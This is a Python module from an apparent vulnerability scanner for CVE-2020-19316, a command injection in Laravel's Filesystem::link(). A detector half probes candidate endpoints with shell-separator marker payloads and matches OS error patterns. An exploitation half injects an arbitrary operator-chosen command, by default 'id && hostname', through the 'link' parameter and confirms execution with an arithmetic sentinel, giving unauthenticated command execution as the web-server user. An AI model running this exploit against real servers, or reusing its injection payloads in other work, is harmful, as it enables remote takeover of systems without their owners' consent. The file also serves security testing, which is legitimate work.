#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2020-19316')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2020-19316 — Laravel < 5.8.17 OS Command Injection (SAFE DETECTOR)

Summary:
    Laravel's Filesystem::link() function fails to safely handle user-
    supplied input before passing it into underlying OS commands. In
    affected versions (< 5.8.17), this may allow remote OS command
    injection depending on how the application exposes filesystem linking.

SAFE DETECTION:
 ✔ Checks if symbolic link functionality is exposed (common patterns)
 ✔ Sends harmless fuzz input designed to trigger OS error output
 ✔ Detects OS-injection error patterns (sh, bash, cmd.exe)
 ✔ NON-DESTRUCTIVE — never executes harmful commands
 ✔ Fully compatible with main.py scanning engine
"""

import re
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Endpoint that exposes the Filesystem::link()-style shell sink in the lab.
LINK_ENDPOINT = "/storage/link"

OS_ERROR_PATTERNS = [
    r"sh: .* not found",
    r"bash: .* command not found",
    r"/bin/sh:",
    r"/bin/bash:",
    r"cannot create symbolic link",
    r"ln: .* invalid",
    r"cmd\.exe",
    r"mklink",
    r"The syntax of the command is incorrect",
    r"A required privilege is not held by the client",
    r"system\(",
]

os_error_re = re.compile("|".join(OS_ERROR_PATTERNS), re.IGNORECASE)
DETECT_MARKER = "CVE19316_DETECT"

COMMON_LINK_ENDPOINTS = [
    "/storage/link",            # common symlink entry
    "/admin/storage/link",
    "/artisan/storage/link",
    "/file/link",
    "/fs/link",
]


def _safe_get(sess, url, params=None, timeout=6):
    try:
        return sess.get(url, params=params, timeout=timeout, verify=False)
    except Exception:
        return None


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    base = target_url.rstrip("/")

    result = {
        "cve_id": "CVE-2020-19316",
        "name": "Laravel < 5.8.17 OS Command Injection (Filesystem::link)",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "endpoint": None,
        "evidence": [],
        "detection_methods": [],
        "error": None,
    }

    # Send harmless marker params directly to each candidate. This folds the old
    # no-param "is the endpoint present?" probe into the proof request itself.
    payloads = [
        {
            "target": "///invalid///path",
            "link": f"; echo {DETECT_MARKER}",
            "style": "posix-shell",
        },
        {
            "target": r"C:\lab\missing-target",
            "link": f"x & echo {DETECT_MARKER} & rem",
            "style": "windows-cmd",
        },
    ]

    observed = []
    os_error_hit = None
    for ep in COMMON_LINK_ENDPOINTS:
        candidate = base + ep
        for payload in payloads:
            style = payload["style"]
            params = {k: v for k, v in payload.items() if k != "style"}
            r = _safe_get(sess, candidate, params=params)
            if r is None:
                observed.append(f"{ep} {style}: no response")
                continue
            if r.status_code in (403, 404, 405, 410):
                observed.append(f"{ep} {style}: HTTP {r.status_code}")
                break

            result["endpoint"] = candidate
            body = r.text or ""
            output_region = body.split("\n", 1)[1] if "\n" in body else body

            # A marker in the post-echo output region proves the shell separator was
            # interpreted. The marker is harmless and avoids treating a reflected
            # command line as detection by itself.
            if DETECT_MARKER in output_region:
                result["vulnerable"] = True
                result["status"] = "confirmed_vulnerable"
                result["verdict"] = "confirmed_vulnerable"
                result["proof_type"] = "safe_active"
                result["detection_methods"].append(f"{style}_marker_execution")
                result["evidence"].append(
                    f"Harmless {style} command marker executed via link parameter"
                )
                return result

            if os_error_re.search(body):
                os_error_hit = style

            observed.append(f"{ep} {style}: no marker or OS command signature")

    if os_error_hit:
        result["status"] = "sink_reachable"
        result["verdict"] = "sink_reachable"
        result["proof_type"] = "error_fingerprint"
        result["detection_methods"].append(f"{os_error_hit}_os_error_pattern_detection")
        result["evidence"].append("OS command error signature detected")
    elif observed:
        result["evidence"].extend(observed)
    else:
        result["evidence"].append("No exposed link() endpoint or OS error signatures observed")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2020-19316 exploitation half — Laravel Filesystem::link() OS command injection.

Split from the original modules/cve_2020_19316.py (detection half: modules/cves/cve_2020_19316.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import re
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# ----------------------------------------------------------------------------
# EXPLOIT — CVE-2020-19316 (Laravel Filesystem::link() OS command injection)
# ----------------------------------------------------------------------------
#
# The vulnerable sink builds `ln -s <target> <link> 2>&1` by raw concatenation
# of the attacker-controlled `target` / `link` query params and runs it via
# shell_exec, reflecting the combined stdout+stderr. Shell metacharacters in
# `link` (e.g. `x; <cmd>`) therefore break out of the `ln` invocation and run
# arbitrary commands as the web-server user. This is command-capable, unauth,
# and needs no APP_KEY.
#
# Anti-false-positive note: the handler ALSO echoes the literal command string
# back as the first response line (`$ ln -s ... ; <payload> 2>&1`). A naive
# substring search for the injected command would match that echo even on a
# NON-executing/patched target. So we:
#   * strip the echoed command line (everything before the first newline), and
#   * use an arithmetic sentinel `$((A+B))` whose *executed* form (the sum)
#     differs from its *literal* form. Only genuine shell execution turns
#     `$((41+8))` into `49`, so seeing the computed marker in the OUTPUT region
#     is un-fakeable proof of execution for ANY command.

_UID_RE = re.compile(r"uid=(\d+)\(")


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt OS command injection via the Filesystem::link()-style sink.

    Unauthenticated, command-capable. Returns the contract dict (never raises).
    """
    sess = session or http_config.get_auth_session()

    result = {
        "cve": "CVE-2020-19316",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    try:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        base = target_url.rstrip("/")

        options = options or {}
        posix_cmd = command or "echo CVE-2020-19316 PoC && id && hostname"
        windows_cmd = command or "echo CVE-2020-19316 PoC && id && hostname"

        # Try the SAME candidate endpoints the detector probes (a non-default route
        # must not make detect-flag-but-exploit-404). Precedence: an explicitly
        # detected/supplied endpoint first, then the shared candidate list (which
        # already leads with /storage/link). Dedup, preserve order.
        candidate_paths = []
        opt_eps = options.get("endpoints") or []
        if isinstance(opt_eps, str):
            opt_eps = [opt_eps]
        detected = kwargs.get("detection") or {}
        detected_endpoint = detected.get("endpoint") or detected.get("url")
        for ep in [options.get("endpoint"), detected_endpoint] + list(opt_eps) + [LINK_ENDPOINT] + list(COMMON_LINK_ENDPOINTS):
            if not ep:
                continue
            # Accept either a bare path ("/storage/link") or a full detected URL.
            if ep.startswith(("http://", "https://")):
                path = ep[len(base):] if ep.startswith(base) else ep
            else:
                path = ep if ep.startswith("/") else "/" + ep
            if path not in candidate_paths:
                candidate_paths.append(path)

        marker = "CHK"
        executed_marker = f"{marker}49{marker}"
        payloads = [
            {
                "shell": "posix-shell",
                # The literal arithmetic form differs from the executed form,
                # so the marker cannot be satisfied by the echoed command line.
                "link": f"x; echo {marker}$((41+8)){marker}; {posix_cmd}",
                "target": "/tmp/labsrc",
                "command": posix_cmd,
            },
            {
                "shell": "windows-cmd",
                # cmd.exe does not support $((..)); use the same marker after
                # the first response line has been stripped, and end with rem so
                # the trailing mklink target/redirection is not parsed as part
                # of the operator command.
                "link": f"x & echo {executed_marker} & {windows_cmd} & rem",
                "target": r"C:\lab\missing-target",
                "command": windows_cmd,
            },
        ]

        result["artifacts"] = {
            "endpoints_tried": [],
            "param": "link",
            "payloads": [],
            "marker": executed_marker,
        }

        last_reason = "no candidate link endpoint was reachable"
        last_body = ""

        for path in candidate_paths:
            url = base + path
            result["artifacts"]["endpoints_tried"].append(url)

            for payload in payloads:
                params = {"target": payload["target"], "link": payload["link"]}
                result["artifacts"]["payloads"].append(
                    {"shell": payload["shell"], "link": payload["link"]}
                )

                try:
                    r = sess.get(url, params=params, timeout=15, verify=False)
                except Exception as e:
                    last_reason = f"request to {url} failed: {e}"
                    continue

                if r.status_code != 200:
                    last_reason = (
                        f"{path} returned HTTP {r.status_code} "
                        f"(endpoint not present / not the vulnerable handler)"
                    )
                    continue

                body = r.text or ""

                # Strip the echoed command line so we only inspect the real OUTPUT.
                # The handler emits "$ <cmd>\n<output>"; the cmd line has no newline,
                # so split once on the first newline.
                if "\n" in body:
                    output_region = body.split("\n", 1)[1]
                else:
                    output_region = ""

                if executed_marker in output_region:
                    # Genuine shell execution confirmed. The requested command's output
                    # immediately follows the marker line in the same OUTPUT region.
                    result["success"] = True
                    result["artifacts"]["endpoint"] = url
                    result["artifacts"]["shell"] = payload["shell"]
                    result["artifacts"]["command"] = payload["command"]
                    captured = output_region
                    idx = output_region.find(executed_marker)
                    if idx != -1:
                        after = output_region[idx + len(executed_marker):].lstrip("\r\n")
                        if after.strip():
                            captured = after
                    result["evidence"] = captured.strip()[:4000]

                    m = _UID_RE.search(body)
                    who = f" (web-server uid={m.group(1)})" if m else ""
                    result["detail"] = (
                        f"Command injection confirmed via {path} `link` param "
                        f"using {payload['shell']}; `{payload['command']}` executed "
                        f"on the server{who}."
                    )
                    return result

                # Reachable (200) but no executed sentinel -> patched/escaped/reflect-only.
                last_reason = (
                    f"{path} reachable (HTTP 200) but injected sentinel did not appear in the "
                    f"command-output region for {payload['shell']} "
                    f"(no shell execution; target may be patched/escaped)."
                )
                last_body = body

        # No candidate endpoint genuinely executed the command. Honest failure.
        result["reason"] = last_reason
        result["detail"] = "No candidate link endpoint executed the injected command."
        if last_body:
            result["evidence"] = last_body.strip()[:600]
        return result

    except Exception as e:  # absolute backstop — never raise to caller
        result["reason"] = f"unexpected error: {e}"
        result["detail"] = "Exploit aborted due to internal error."
        return result
